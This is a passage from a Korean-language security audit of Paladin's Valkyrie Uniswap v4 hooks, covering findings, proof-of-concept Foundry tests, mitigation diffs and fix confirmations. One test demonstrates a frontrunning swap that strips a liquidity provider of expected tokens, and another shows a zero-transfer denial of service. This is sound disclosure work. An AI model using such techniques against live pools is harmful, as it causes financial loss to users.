    MockERC20 token0WithLessDecimals = new MockERC20("TEST1", "TEST1", 18);
    token0WithLessDecimals.mint(address(this), 1_000_000 * 10 ** 18);
    MockERC20 token1WithLessDecimals = new MockERC20("TEST2", "TEST2", 6);
    token1WithLessDecimals.mint(address(this), 1_000_000 * 10 ** 6);

    PoolKey memory newKey = createPoolKey(address(token0WithLessDecimals), address(token1WithLessDecimals), 3000, hookAddress);
    PoolId newId = key.toId();

    token0WithLessDecimals.approve(address(fullRange), type(uint256).max);
    token1WithLessDecimals.approve(address(fullRange), type(uint256).max);

    initPool(newKey.currency0, newKey.currency1, IHooks(hookAddress), 3000, SQRT_PRICE_1_1);

    uint128 liquidityMinted = fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            newKey.currency0,
            newKey.currency1,
            3000,
            100 * 10 ** 18,
            100 * 10 ** 6,
            0,
            0,
            address(this),
            MAX_DEADLINE
        )
    );

    assertEq(liquidityMinted, 100 * 10 ** 6);
}
```
위에서 설명한 것처럼 풀 유동성은 두 토큰 중 하나만 18 소수점 미만이면 소수점을 상속받습니다.

**Recommended Mitigation:** 통화의 기본이 되는 두 ERC-20 토큰의 `decimals()` 함수를 구현하고 제곱근 가격이 의도한 전체 범위 내에 있는 동안 유동성이 추가된다고 가정하면, `FullRangeHook.sol`은 다음과 같이 수정될 수 있습니다.

```diff
    function beforeInitialize(address, PoolKey calldata key, uint160)
        external
        override
        onlyPoolManager
        returns (bytes4)
    {
        if (key.tickSpacing != 60) revert TickSpacingNotDefault();

        PoolId poolId = key.toId();

        // Prepare the symbol for the LP token to be deployed
        string memory symbol0 =
            key.currency0.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency0)).symbol();
        string memory symbol1 =
            key.currency1.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency1)).symbol();

        string memory tokenSymbol =
            string(abi.encodePacked("UniV4", "-", symbol0, "-", symbol1, "-", Strings.toString(uint256(key.fee))));
        // Deploy the LP token for the Pool
++      uint8 token0Decimals = IERC20Metadata(Currency.unwrap(key.currency0)).decimals();
++      uint8 token1Decimals = IERC20Metadata(Currency.unwrap(key.currency1)).decimals();
++      uint8 liquidityDecimals = token0Decimals < token1Decimals ? token0Decimals : token1Decimals;
--      address poolToken = address(new IncentivizedERC20(tokenSymbol, tokenSymbol, poolId));
++      address poolToken = address(new IncentivizedERC20(tokenSymbol, tokenSymbol, poolId, liquidityDecimals));
        ...
    }
```

`IncentivizedERC20`:
```diff
contract IncentivizedERC20 is ERC20, Owned {

--  constructor(string memory name, string memory symbol, PoolId id) ERC20(name, symbol, 18) Owned(msg.sender) {
++  constructor(string memory name, string memory symbol, PoolId id, uint8 decimals) ERC20(name, symbol, decimals) Owned(msg.sender) {
        hook = msg.sender;
        poolId = id;
    }
}
```

**Paladin:** 커밋 [`1d592ba`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/1d592ba98f94b43620a0a3255c5823b04f57ecbc)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. `IncentivizedERC20` 소수점은 이제 더 낮은 소수점의 기본 토큰에서 상속됩니다.


### ERC-20 tokens that do not implement `symbol()` are incompatible despite being accepted by Uniswap v4

**Description:** 이 프로토콜은 Uniswap v4에서 허용하는 모든 ERC-20 토큰을 지원하려고 합니다. 그러나 Uniswap v4는 ERC-20 표준의 선택적 `symbol()` 메서드를 구현하지 않는 토큰도 허용합니다.

다음 테스트에서는 `symbol()` 메서드를 구현하지 않는 사용자 지정 모의 객체(mock)로 Uniswap V4 풀을 생성합니다:
```solidity
function test_PoolCreationWithTokensWithoutSymbols() public {
    MockERC20WithoutSymbol token0WithoutSymbol = new MockERC20WithoutSymbol("TEST1", 18);
    token0WithoutSymbol.mint(address(this), 1_000_000 * 10 ** 18);
    MockERC20WithoutSymbol token1WithoutSymbol = new MockERC20WithoutSymbol("TEST2", 18);
    token1WithoutSymbol.mint(address(this), 1_000_000 * 10 ** 18);

    vm.expectRevert();
    IERC20Metadata(address(token0WithoutSymbol)).symbol();
    vm.expectRevert();
    IERC20Metadata(address(token1WithoutSymbol)).symbol();

    PoolKey memory newKey = createPoolKey(address(token0WithoutSymbol), address(token1WithoutSymbol), 3000, hookAddress);
    PoolId newId = key.toId();

    token0WithoutSymbol.approve(address(fullRange), type(uint256).max);
    token1WithoutSymbol.approve(address(fullRange), type(uint256).max);

    // address(0) is passed as the hook to prevent the revert from the actual FullRangeHook initialization
    initPool(newKey.currency0, newKey.currency1, IHooks(address(0)), 3000, SQRT_PRICE_1_1);
}
```

Uniswap v4는 이러한 종류의 ERC-20 토큰을 지원하지만, `FullRangeHook` 및 `MultiRangeHook`은 모두 `symbol()` 메서드를 호출할 수 있다고 가정하기 때문에 이를 지원하지 않습니다.

`FullRangeHook`:
```solidity
function beforeInitialize(address, PoolKey calldata key, uint160)
    external
    override
    onlyPoolManager
    returns (bytes4)
{
    ...
    // Prepare the symbol for the LP token to be deployed
    string memory symbol0 =
        key.currency0.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency0)).symbol();
    string memory symbol1 =
        key.currency1.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency1)).symbol();

    string memory tokenSymbol =
        string(abi.encodePacked("UniV4", "-", symbol0, "-", symbol1, "-", Strings.toString(uint256(key.fee))));
    // Deploy the LP token for the Pool
    address poolToken = address(new IncentivizedERC20(tokenSymbol, tokenSymbol, poolId));
    ...
}
```

`MultiRangeHook`:
```solidity
function createRange(PoolKey calldata key, RangeKey calldata rangeKey) external {
    ...
    // Prepare the symbol for the LP token to be deployed
    string memory symbol0 =
        key.currency0.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency0)).symbol();
    string memory symbol1 =
        key.currency1.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency1)).symbol();

    string memory tokenSymbol =
        string(abi.encodePacked("UniV4", "-", symbol0, "-", symbol1, "-", Strings.toString(uint256(key.fee))));
    // Deploy the LP token for the Pool
    address lpToken = address(new IncentivizedERC20(tokenSymbol, tokenSymbol, poolId));
    ...
}
```

**Impact:** Uniswap이 지원함에도 불구하고 이 토큰을 사용할 수 없으므로 심각도는 높지만, `symbol()` 메서드가 구현되지 않은 경우는 비교적 드물기 때문에 가능성은 낮아 전반적인 영향은 중간입니다.

**Proof of Concept:** 초기화 시 revert 되는 `FullRangeHook`을 사용하도록 위에서 수정한 다음 테스트를 `FullRangeHook.t.sol`에 추가해야 합니다:
```solidity
function test_PoolCreationWithTokensWithoutSymbols() public {
    MockERC20WithoutSymbol token0WithoutSymbol = new MockERC20WithoutSymbol("TEST1", 18);
    token0WithoutSymbol.mint(address(this), 1_000_000 * 10 ** 18);
    MockERC20WithoutSymbol token1WithoutSymbol = new MockERC20WithoutSymbol("TEST2", 18);
    token1WithoutSymbol.mint(address(this), 1_000_000 * 10 ** 18);

    vm.expectRevert();
    IERC20Metadata(address(token0WithoutSymbol)).symbol();
    vm.expectRevert();
    IERC20Metadata(address(token1WithoutSymbol)).symbol();

    PoolKey memory newKey = createPoolKey(address(token0WithoutSymbol), address(token1WithoutSymbol), 3000, hookAddress);
    PoolId newId = key.toId();

    token0WithoutSymbol.approve(address(fullRange), type(uint256).max);
    token1WithoutSymbol.approve(address(fullRange), type(uint256).max);

    vm.expectRevert();
    initPool(newKey.currency0, newKey.currency1, IHooks(address(fullRange)), 3000, SQRT_PRICE_1_1);
}
```
테스트를 실행하려면 `MockERC20WithoutSymbol`이 필요하며 재현하기 쉽습니다.

**Recommended Mitigation:** 주어진 토큰이 `symbol()` 메서드를 구현하는지 확인하기 위해 `try/catch` 구조를 구현하는 것이 좋습니다. 지원되지 않는 경우 기본 심볼을 대신 사용할 수 있습니다.

**Paladin:** 인정함(Acknowledged), 그러나 이슈에서 언급했듯이 `symbol()` 함수를 구현하지 않는 ERC20을 만나는 것은 비교적 드물기 때문에 우리는 훅에서 이러한 토큰을 지원하지 않기로 했습니다. 이러한 드문 토큰에 대한 풀은 Subscriber 또는 이 엣지 케이스를 처리할 다른 훅을 통해 Valkyrie에 연결될 수 있기 때문입니다 => 여기서 변경 사항 없음.

**Cyfrin:** 인정함(Acknowledged).


### Donations can be made directly to the Uniswap v4 pool due to missing overrides

**Description:** 현재 기부(donation) 훅은 활성화되어 있지 않습니다:

```solidity
function getHookPermissions() public pure virtual override returns (Hooks.Permissions memory) {
    return Hooks.Permissions({
        ...
        beforeAddLiquidity: true,
        beforeRemoveLiquidity: false,
        afterAddLiquidity: false,
        afterRemoveLiquidity: false,
        beforeDonate: false,
        afterDonate: false,
        ...
    });
}
```

Uniswap v4의 `PoolManager::donate` 및 `Hooks::beforeDonate`에 대한 다음 구현을 고려할 때, 기본 동작이 재정의(override)되지 않았기 때문에 기부가 여전히 허용됩니다:

```solidity
function donate(PoolKey memory key, uint256 amount0, uint256 amount1, bytes calldata hookData)
    external
    onlyWhenUnlocked
    noDelegateCall
    returns (BalanceDelta delta)
{
    PoolId poolId = key.toId();
    Pool.State storage pool = _getPool(poolId);
    pool.checkPoolInitialized();

    key.hooks.beforeDonate(key, amount0, amount1, hookData);

    delta = pool.donate(amount0, amount1);

    _accountPoolBalanceDelta(key, delta, msg.sender);

    // event is emitted before the afterDonate call to ensure events are always emitted in order
    emit Donate(poolId, msg.sender, amount0, amount1);

    key.hooks.afterDonate(key, amount0, amount1, hookData);
}

function beforeDonate(IHooks self, PoolKey memory key, uint256 amount0, uint256 amount1, bytes calldata hookData)
    internal
    noSelfCall(self)
{
    if (self.hasPermission(BEFORE_DONATE_FLAG)) {
        self.callHook(abi.encodeCall(IHooks.beforeDonate, (msg.sender, key, amount0, amount1, hookData)));
    }
}
```

훅은 `before/afterDonate()`에 대해 활성화된 권한을 갖도록 의도하지 않지만, 이는 단순히 훅에 대한 호출을 건너뛴다는 것을 의미합니다. 따라서 의도하지 않은 시점에 기부가 이루어질 수 있습니다. 그러나 광범위한 조사 결과, 이 동작을 활용하여 첫 번째 예치자 인플레이션 공격(first depositor inflation attack)을 실행할 수는 없는 것으로 보입니다.

**Impact:** 기부로 인해 수수료 증가(fee growth)가 인위적으로 부풀려질 수 있습니다.

**Recommended Mitigation:** `beforeDonate()` 훅을 활성화하고 기부 시 항상 revert 하여 수수료 인플레이션을 방지해야 합니다.

**Paladin:** 인정함(Acknowledged). 그러나 훅을 통해 주어진 풀/범위에 대한 `feeGrowth`를 증가시키는 기부는 문제가 되지 않아야 합니다:
• `FullRange`의 경우, 유동성이 수정될 때 기부금은 풀에서 재조정(rebalanced)되어 풀 유동성 추가에 사용됩니다. 대규모 기부는 풀의 가격을 증가/감소시킬 수 있지만 이는 나중에 차익 거래되거나, 받은 추가 수수료는 단순히 재조정 후 풀에 다시 기부되어 나중에 사용될 것입니다.
• `MultiRange`의 경우, 범위 내의 유동성을 재조정할 때 사용되거나 재조정을 위해 나중에 사용하기 위해 인출됩니다.
이것이 훅의 동작이나 인센티브 흐름에 영향을 주어서는 안 되므로, 이러한 훅에 대해 기부를 차단해야 한다고 생각하지 않습니다.

**Cyfrin:** 인정함(Acknowledged).


### Missing slippage protection when removing liquidity

**Description:** 사용자가 유동성을 제거할 때 교환으로 특정 양의 토큰을 기대할 수 있습니다. 그러나 집중된 유동성이 제거되는 범위에 대한 가격의 상대적 위치에 따라, 이는 어느 한 토큰의 단일 측면 유동성 또는 두 토큰의 조합으로 계산될 수 있습니다. 현재 사용자는 유동성을 제거할 때 예상되는 토큰 양을 지정할 수 없습니다. 이는 제거가 샌드위치 공격(front-run)에 취약하여 공격자가 가격을 사용자가 손실을 입는 구간으로 이동시킬 수 있기 때문에 문제입니다.

Uniswap과 상호 작용하는 모든 라우터 및 유사한 UX 중심 컨트랙트는 사용자가 제거되는 유동성과 교환하여 받을 것으로 예상하는 각 토큰의 최소 금액을 지정할 수 있도록 슬리피지 보호를 구현합니다. 예를 들어 Uniswap V4 `PositionManager` 구현은 다음과 같습니다:

```solidity
    function _decrease(
        uint256 tokenId,
        uint256 liquidity,
@>      uint128 amount0Min,
@>      uint128 amount1Min,
        bytes calldata hookData
    ) internal onlyIfApproved(msgSender(), tokenId) {
        (PoolKey memory poolKey, PositionInfo info) = getPoolAndPositionInfo(tokenId);

        // Note: the tokenId is used as the salt.
        (BalanceDelta liquidityDelta, BalanceDelta feesAccrued) =
            _modifyLiquidity(info, poolKey, -(liquidity.toInt256()), bytes32(tokenId), hookData);
        // Slippage checks should be done on the principal liquidityDelta which is the liquidityDelta - feesAccrued
@>      (liquidityDelta - feesAccrued).validateMinOut(amount0Min, amount1Min);
    }
```

이 문제는 `MultiRangeHook` 컨트랙트에서 특히 문제가 되는데, 가격이 생성된 모든 범위에서 자유롭게 이동하도록 의도되었기 때문입니다. 따라서 유동성 계산은 크게 달라질 수 있습니다. `FullRangeHook`의 경우 가격이 전체 범위 내에서만 독점적으로 이동하도록 의도되었지만, 사용자가 받을 각 토큰의 최소 금액을 지정할 수 있도록 하는 것이 여전히 바람직하며, 특히 의도된 범위가 Uniswap에 의해 구현된 경계를 완전히 커버하지 않는다는 점을 고려하면 더욱 그렇습니다.

**Impact:** 유동성 공급자는 유동성을 제거할 때 슬리피지에 노출됩니다.

**Proof of Concept:** 다음 테스트는 `MultiRangeHook.t.sol` 내에 배치되어야 합니다:

```solidity
function test_MissingSlippageProtection() public {
    int24 lowerTick = -1020;
    int24 upperTick = 1020;
    int24 currentTick = 0;

    uint160 currentSqrtPrice = TickMath.getSqrtPriceAtTick(currentTick);

    initPool(key2.currency0, key2.currency1, IHooks(address(multiRange)), 1000, currentSqrtPrice);

    rangeKey = RangeKey(id2, lowerTick, upperTick);
    rangeId = rangeKey.toId();

    multiRange.createRange(key2, rangeKey);

    uint256 token0Amount = 100 ether;
    uint256 token1Amount = 100 ether;

    // User1 mints 100 tokens of each worth of liquidity when the price is between the range
    uint128 mintedLiquidity = multiRange.addLiquidity(
        MultiRangeHook.AddLiquidityParams(
            key2, rangeKey, token0Amount, token1Amount, 99 ether, 99 ether, address(this), MAX_DEADLINE
        )
    );

    IPoolManager.SwapParams memory params =
        IPoolManager.SwapParams({ zeroForOne: true, amountSpecified: -1000 ether, sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(lowerTick - 60) });
    HookEnabledSwapRouter.TestSettings memory settings =
        HookEnabledSwapRouter.TestSettings({ takeClaims: false, settleUsingBurn: false });

    // User1 is about to remove all the liquidity but gets frontrun by someone that moves the price out of the range
    router.swap(key2, params, settings, ZERO_BYTES);

    address liquidityToken = multiRange.rangeLpToken(rangeId);
    IncentivizedERC20(liquidityToken).approve(address(multiRange), type(uint256).max);

    MultiRangeHook.RemoveLiquidityParams memory removeLiquidityParams =
        MultiRangeHook.RemoveLiquidityParams(key2, rangeKey, mintedLiquidity - 1000, MAX_DEADLINE);

    // User1 expected similar amount of each tokens from what he deposited but instead they only receives an amount of token 0
    BalanceDelta delta = multiRange.removeLiquidity(removeLiquidityParams);

    console.log("Token 0 received from liquidity removal:", delta.amount0());
    console.log("Token 1 received from liquidity removal:", delta.amount1());
}
```

Output:
```bash
Ran 1 test for test/MultiRangeHook.t.sol:TestMultiRangeHook
[PASS] test_MissingSlippageProtection() (gas: 1988383)
Logs:
  Token 0 received from liquidity removal: 205337358362575417542
  Token 1 received from liquidity removal: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.33ms (1.32ms CPU time)
```

**Recommended Mitigation:** `MultiRangeHook`의 경우:
```diff
    struct RemoveLiquidityParams {
        PoolKey key;
        RangeKey range;
        uint256 liquidity;
        uint256 deadline;
++      uint256 token0Min;
++      uint256 token1Min;
    }


    function removeLiquidity(RemoveLiquidityParams calldata params)
        public
        virtual
        nonReentrant
        ensure(params.deadline)
        returns (BalanceDelta delta)
    {
        ...
        // Remove liquidity from the Pool
        delta = modifyLiquidity(
            params.key,
            params.range,
            IPoolManager.ModifyLiquidityParams({
                tickLower: params.range.tickLower,
                tickUpper: params.range.tickUpper,
                liquidityDelta: -(params.liquidity.toInt256()),
                salt: 0
            })
        );

++      if(uint128(delta.amount0()) < params.token0Min || uint128(delta.amount1()) < params.token1Min) revert();

        // Burn the LP tokens
        IncentivizedERC20(lpToken).burn(msg.sender, params.liquidity);

        emit Withdrawn(msg.sender, poolId, rangeId, params.liquidity);
    }
```

`FullRangeHook`의 경우:
```diff
    struct RemoveLiquidityParams {
        Currency currency0;
        Currency currency1;
        uint24 fee;
        uint256 liquidity;
        uint256 deadline;
++      uint256 token0Min;
++      uint256 token1Min;
    }

    function removeLiquidity(RemoveLiquidityParams calldata params)
        public
        virtual
        nonReentrant
        ensure(params.deadline)
        returns (BalanceDelta delta)
    {
       ...

        // Remove liquidity from the Pool
        delta = modifyLiquidity(
            key,
            IPoolManager.ModifyLiquidityParams({
                tickLower: MIN_TICK,
                tickUpper: MAX_TICK,
                liquidityDelta: -(params.liquidity.toInt256()),
                salt: 0
            })
        );

++      if(uint128(delta.amount0()) < params.token0Min || uint128(delta.amount1()) < params.token1Min) revert();

        // Burn the LP tokens
        erc20.burn(msg.sender, params.liquidity);

        emit Withdrawn(msg.sender, poolId, params.liquidity);
    }
```

**Paladin:** 커밋 [`653ca73`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/678d95706a3d5607f73ee80b8a6695697e8e2fbd)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 유동성을 제거할 때의 슬리피지 검사가 두 훅 모두에 추가되었습니다.


### Deposited rewards get stuck in incentive logic contracts when there is no pool liquidity

**Description:** 풀에 유동성이 0이고 보상이 활발하게 분배되고 있는 시간 간격 동안, 유동성이 0인 이 간격에 해당하는 비례 보상 금액은 누구도 인출할 수 없게 됩니다.

**Impact:** 이 시나리오가 발생할 확률은 매우 낮지만 자금 손실을 초래할 수 있습니다.

**Recommended Mitigation:** `accumulatedFees` 스토리지 변수에 누적하여 해당 보상 금액을 소유자에게 할당하세요:

```diff
    function _updateRewardState(IncentivizedPoolId id, address token, address account) internal virtual {
        // Sync pool total liquidity if not already done
        if(!poolSynced[id]) {
            _syncPoolLiquidity(id);
            poolSynced[id] = true;
        }

        RewardData storage _state = poolRewardData[id][token];
        uint96 newRewardPerToken = _newRewardPerToken(id, token).toUint96();
        _state.rewardPerTokenStored = newRewardPerToken;

++      uint256 lastUpdateTimeApplicable = block.timestamp < _state.endTimestamp ? block.timestamp : _state.endTimestamp;
++      if (poolStates[id].totalLiquidity == 0) {
++          accumulatedFees[token] += (lastUpdateTimeApplicable - _state.lastUpdateTime) * _state.ratePerSec;
++      }
++      _state.lastUpdateTime = uint32(lastUpdateTimeApplicable);

--      uint32 endTimestampCache = _state.endTimestamp;
--      _state.lastUpdateTime = block.timestamp < endTimestampCache ? block.timestamp.toUint32() : endTimestampCache;

        // Update user state if an account is provided
        if (account != address(0)) {
            if(!userLiquiditySynced[id][account]) {
                _syncUserLiquidity(id, account);
                userLiquiditySynced[id][account] = true;
            }

            UserRewardData storage _userState = userRewardStates[id][account][token];
            _userState.accrued = _earned(id, token, account).toUint160();
            _userState.lastRewardPerToken = newRewardPerToken;
        }
    }
```

**Paladin:** 커밋 [`653ca73`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/653ca73877737196c7728db8c01d2a803959d72d)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 모든 `_updateRewardState()` 구현은 제로 유동성에 분배된 보상을 수수료로 누적하도록 업데이트되었습니다. 그러나, 모든 인스턴스에서 마지막 업데이트 시간이 `uint48` 대신 `uint32`로 잘못 캐스팅되었습니다:
```solidity
_state.lastUpdateTime = uint32(lastUpdateTimeApplicable);
```

**Paladin:** 커밋 [`f3e5251`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/f3e52516ef4c9c99795772227b25f1cd3878bab3)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 불필요한 다운캐스트가 제거되었습니다.


### Missing duplicate Incentive Logic can result in Incentive System accounting being broken

**Description:** `IncentiveManager::addIncentiveLogic`을 사용하면 소유자가 인센티브 시스템 목록에 새 인센티브 로직을 추가할 수 있습니다:

```solidity
function addIncentiveLogic(address logic) external onlyOwner {
    uint256 _index = nextIncentiveIndex;
    incentiveSystems[_index] = IncentiveSystem(logic, IIncentiveLogic(logic).updateOnSwap());
    incentiveSystemIndex[logic] = _index;
    nextIncentiveIndex++;

    emit NewIncentiveLogic(_index, logic);
}
```

소유자가 추가하면 인센티브 로직은 `IncentiveManager::addPoolIncentiveSystem`을 호출할 수 있습니다:

```solidity
function addPoolIncentiveSystem(IncentivizedPoolId id) external onlyIncentiveLogics {
    uint256 _systemId = incentiveSystemIndex[msg.sender];
    if (poolListedIncentiveSystems[id][_systemId]) return;
    poolIncentiveSystems[id].push(_systemId);
    poolListedIncentiveSystems[id][_systemId] = true;
}
```

`addIncentiveLogic()`에 중복 유효성 검사가 없으므로 동일한 로직 주소에 대해 이 함수를 두 번 이상 호출하면 기존 인덱스가 덮어써집니다. 이는 인센티브 로직이 다른 인덱스가 `poolIncentiveSystems` 배열에 푸시된 채로 `addPoolIncentiveSystem()`을 여러 번 호출할 수 있음을 의미합니다. 이 함수는 무허가 `BaseIncentiveLogic::depositRewards`에 대한 모든 호출에서 호출되고, 알림 함수는 주어진 풀에 연결된 모든 인센티브 시스템을 루핑하므로 시스템 자체의 인센티브 회계를 손상시킬 가능성이 매우 높습니다.

**Impact:** 소유자가 실수로 주어진 인센티브 로직에 대해 `IncentiveManager::addIncentiveLogic`을 두 번 이상 호출하면 인센티브 시스템 회계가 깨질 수 있습니다.

**Proof of Concept:** 다음 테스트를 `IncentiveManager.t.sol`에 추가해야 합니다:

```solidity
function test_addDuplicateIncentiveLogic() public {
    manager.addHook(address(hook1));
    hook1.notifyInitialize(pool1, lpToken1);
    hook1.notifyInitialize(pool2, lpToken2);

    vm.expectEmit(true, true, true, true);
    emit NewIncentiveLogic(1, address(logic1));
    manager.addIncentiveLogic(address(logic1));

    assertEq(manager.incentiveSystemIndex(address(logic1)), 1);

    assertEq(manager.poolListedIncentiveSystems(id1, 1), false);
    assertEq(manager.poolListedIncentiveSystems(id1, 2), false);

    logic1.addPoolIncentiveSystem(address(manager), id1);

    assertEq(manager.poolListedIncentiveSystems(id1, 1), true);
    assertEq(manager.poolListedIncentiveSystems(id1, 2), false);

    vm.expectEmit(true, true, true, true);
    emit NewIncentiveLogic(2, address(logic1));
    manager.addIncentiveLogic(address(logic1));

    assertEq(manager.incentiveSystemIndex(address(logic1)), 2);

    assertEq(manager.poolListedIncentiveSystems(id1, 1), true);
    assertEq(manager.poolListedIncentiveSystems(id1, 2), false);

    logic1.addPoolIncentiveSystem(address(manager), id1);

    assertEq(manager.poolListedIncentiveSystems(id1, 1), true);
    assertEq(manager.poolListedIncentiveSystems(id1, 2), true);

    (address system1, bool updateOnSwap1) = manager.incentiveSystems(1);
    assertEq(system1, address(logic1));
    assertEq(updateOnSwap1, false);

    (address system2, bool updateOnSwap2) = manager.incentiveSystems(2);
    assertEq(system2, address(logic1));
    assertEq(updateOnSwap2, false);


    int256 amount = int256(10 ether);

    uint256 prev_balance = logic1.userBalances(id1, user1);
    uint256 prev_user_liquidity = manager.poolUserLiquidity(id1, user1);
    uint256 prev_total_liquidity = manager.poolTotalLiquidity(id1);

    vm.expectEmit(true, true, true, true);
    emit LiquidityChange(id1, address(0), user1, uint256(amount));

    hook1.notifyAddLiquidty(pool1, lpToken1, user1, amount);

    uint256 new_balance = logic1.userBalances(id1, user1);
    uint256 new_user_liquidity = manager.poolUserLiquidity(id1, user1);
    uint256 new_total_liquidity = manager.poolTotalLiquidity(id1);

    assertEq(new_balance, prev_balance + uint256(amount));

    assertEq(new_user_liquidity, prev_user_liquidity + uint256(amount));
    assertEq(new_total_liquidity, prev_total_liquidity + uint256(amount));

    assertEq(manager.getPoolTotalLiquidity(id1), new_total_liquidity);
    assertEq(manager.getPoolUserLiquidity(id1, user1), new_user_liquidity);
}
```

중복된 로직으로 인해 실패한 어설션을 보여주는 출력:
```bash
Ran 1 test for test/IncentiveManager.t.sol:TestIncentiveManager
[FAIL: assertion failed: 20000000000000000000 != 10000000000000000000] test_addDuplicateIncentiveLogic() (gas: 464110)
Traces:
  [464110] TestIncentiveManager::test_addDuplicateIncentiveLogic()
...
├─ [661] MockIncentiveLogic::userBalances(0xbfc3c7b8004ffcc0067b8de92da164f24769e5112a4f4f571b7f1d7f70c1d9d0, 0x000000000000000000000000000000000001B207) [staticcall]
│   └─ ← [Return] 20000000000000000000 [2e19]
├─ [908] IncentiveManager::poolUserLiquidity(0xbfc3c7b8004ffcc0067b8de92da164f24769e5112a4f4f571b7f1d7f70c1d9d0, 0x000000000000000000000000000000000001B207) [staticcall]
│   └─ ← [Return] 10000000000000000000 [1e19]
├─ [975] IncentiveManager::poolTotalLiquidity(0xbfc3c7b8004ffcc0067b8de92da164f24769e5112a4f4f571b7f1d7f70c1d9d0) [staticcall]
│   └─ ← [Return] 10000000000000000000 [1e19]
├─ [0] VM::assertEq(20000000000000000000 [2e19], 10000000000000000000 [1e19]) [staticcall]
│   └─ ← [Revert] assertion failed: 20000000000000000000 != 10000000000000000000
└─ ← [Revert] assertion failed: 20000000000000000000 != 10000000000000000000
```

**Recommended Mitigation:** 주어진 로직 컨트랙트에 대해 기존 인덱스를 덮어쓰지 않도록 하세요:
```diff
function addIncentiveLogic(address logic) external onlyOwner {
++  if(incentiveSystemIndex[logic] != 0) revert("Already added");
    uint256 _index = nextIncentiveIndex;
    incentiveSystems[_index] = IncentiveSystem(logic, IIncentiveLogic(logic).updateOnSwap());
    incentiveSystemIndex[logic] = _index;
    nextIncentiveIndex++;

    emit NewIncentiveLogic(_index, logic);
}
```

**Paladin:** 커밋 [`a7c3dc0`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/a7c3dc0a3c23fd26aad4d5aac8b1cd0288e5a55d)으로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 소유자가 동일한 로직을 두 번 추가하려고 시도하면 실행이 revert 됩니다.


### `TimeWeightedIncentiveLogic` distributions are not possible for tokens that revert on zero transfers

**Description:** 주어진 토큰의 보상이 처음으로 `TimeWeightedIncentiveLogic`에 예치될 때, 캐시된 종료 타임스탬프는 0이 됩니다. 현재의 0이 아닌 블록 타임스탬프와 비교하면 실행이 이전 분배가 종료된 후 새로운 분배를 처리하는 조건부 블록으로 들어갑니다. 일반적으로 이 로직은 건전합니다; 그러나 첫 번째 분배에 대해 기존 보상이 없을 때 과거 보상을 제거하려고 시도하면 0 값 전송이 발생합니다.

```solidity
function _depositRewards(
    IncentivizedPoolId id,
    address token,
    uint256 amount,
    uint256 duration,
    uint256 requiredDuration,
    RewardType rewardType
) internal {
    ...

    // Update the reward distribution parameters
    uint32 endTimestampCache = _state.endTimestamp;
    if (endTimestampCache < block.timestamp) {
        ...

        // Remove past rewards if the distribution is over
        _removePastRewards(id, token);

        ...
    } else {
        ...
    }

    ...
}
```

여기서 인출 가능한 금액은 0입니다. 의도한 보상 토큰이 0 전송 시 revert 되는 토큰인 경우, 해당 토큰에 대한 분배가 불가능해집니다.

```solidity
function _removePastRewards(IncentivizedPoolId id, address token) internal {
    address manager = distributionManagers[id][token];

    uint256 amount = withdrawableAmounts[id][token][manager];
    withdrawableAmounts[id][token][manager] = 0;

    IERC20(token).safeTransfer(manager, amount);

    emit RewardsWithdrawn(id, token, manager, amount);
}
```

**Impact:** `TimeWeightedIncentiveLogic` 분배는 0 전송 시 revert 되는 토큰에 대해 불가능합니다.

**Proof of Concept:** 다음 테스트를 `TimeWeightedIncentiveLogic.t.sol`에 추가해야 합니다:

```solidity
function test_ZeroTransferDoS() public {
    ZeroTransferERC20 token = new ZeroTransferERC20("TKN", "TKN", 18);

    logic.updateDefaultFee(0);

    IncentivizedPoolId incentivizedId = IncentivizedPoolKey({ id: pool1, lpToken: lpToken1 }).toId();

    manager.setListedPool(incentivizedId, true);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    uint256 amount = 1000 ether;
    uint256 duration = 5 weeks;
    uint256 requiredDuration = 1 weeks;

    manager.notifyAddLiquidty(systems, pool1, lpToken1, user1, int256(100 ether));

    vm.expectRevert();
    logic.depositRewards(
        incentivizedId,
        address(token),
        amount,
        duration,
        requiredDuration,
        TimeWeightedIncentiveLogic.RewardType.WITHDRAW
    );
}
```

`ZeroTransferERC20`의 경우 관련 전송 함수를 오버라이드합니다:

```solidity
contract ZeroTransferERC20 is MockERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) MockERC20(name, symbol, decimals) {}

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if (amount == 0) revert("zero amount");
        return super.transfer(to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        if (amount == 0) revert("zero amount");
        return super.transferFrom(from, to, amount);
    }
}
```

**Recommended Mitigation:** 전송할 토큰이 없으면 전송을 건너뛰세요:

```diff
function _removePastRewards(IncentivizedPoolId id, address token) internal {
    address manager = distributionManagers[id][token];

    uint256 amount = withdrawableAmounts[id][token][manager];
    withdrawableAmounts[id][token][manager] = 0;

--  IERC20(token).safeTransfer(manager, amount);
++  if (amount != 0) IERC20(token).safeTransfer(manager, amount);

    emit RewardsWithdrawn(id, token, manager, amount);
}
```

**Paladin:** 커밋 [`b294f21`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/b294f21b27c6d60a8238015018b16d1fb3d17d98)로 수정되었습니다.

